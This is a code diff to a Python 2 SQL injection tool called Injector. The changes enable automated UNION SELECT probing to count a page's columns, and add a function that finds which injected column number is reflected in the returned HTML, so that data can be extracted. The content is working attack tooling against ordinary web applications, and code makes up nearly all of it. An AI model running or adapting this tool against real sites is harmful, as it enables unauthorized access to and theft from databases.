@@ -6,6 +6,8 @@
 import os, sys, urllib2
 import operator
 import json
+import re
+from collections import Counter
     
 class Injector:
     
@@ -49,15 +51,16 @@ class Injector:
         count = 1
     
         original_page = self.get_page(page)
-        """
-            ### Using UNION SELECT appending 1,2,... ###
-            union = page + '%20UNION%20SELECT%201'
-            # Heuristic just looks for SELECT, needs to be MORE NUANCED!
-            while 'SELECT' in self.html_diff(original_page, self.get_page(union)):
-                count += 1
-                union += ',%20' + str(count + self.offset)
-        """
+        ### Using UNION SELECT appending 1,2,... ###
+        union = page + '%20UNION%20SELECT%201'
 
+        ### Heuristic just looks for SELECT or empty list, needs to be MORE NUANCED!
+
+        while len(self.html_diff(original_page, self.get_page(union))) == 0 or 'SELECT' in self.html_diff(original_page, self.get_page(union)):
+            count += 1
+            union += ',%20' + str(count + self.offset)
+
+        """
         ### Using ORDER BY x--, x = 9,8,... ###
         count = self.columns_upper_limit_guess
         order_by = page + self.delimiter + 'ORDER' + self.delimiter + 'BY' + self.delimiter + str(count) + '--'
@@ -66,25 +69,25 @@ class Injector:
             temp = list(order_by)
             temp[-3] = str(count)
             order_by = "".join(temp)
+        """
     
         return count
     
     def get_visible_param(self, page):
-        number_counts = {i: 0 for i in xrange(1, self.get_num_columns(page) + 1)}
-
-        union_urls = ['%20' + str(i + self.offset) for i in number_counts ]
+        """ Get most common number appearing in HTML, this is where to inject variables.
+            :page: List of HTML lines.
+            :returns: Most commonly seen number in page, hopefully the injectable param.
+        """
+        
+        # Make query string
+        union_urls = ['%20' + str(i + self.offset) for i in xrange(1, self.get_num_columns(page) + 1)]
         new_url = page.split('=')[0] + '=null' + '%20UNION%20SELECT' + ",".join(union_urls)
 
-        # Get most common number appearing in HTML, this is where to inject variables
         diff = self.html_diff(self.get_page(page), self.get_page(new_url))
-        for line in diff:
-            for key in number_counts:
-                if str(key) in line:
-                    number_counts[key] += 1
+        nums = [filter(str.isdigit, re.sub('<.*>','', line)) for line in diff]
+        nums.remove('')
 
-        # Return most common number (number with most instances in HTML)
-        return max(number_counts.iteritems(), key = operator.itemgetter(1))[0]
-
+        return Counter(nums).most_common(1)[0][0]
         
     
     # Takes page to fuzz for injections and params to check for.
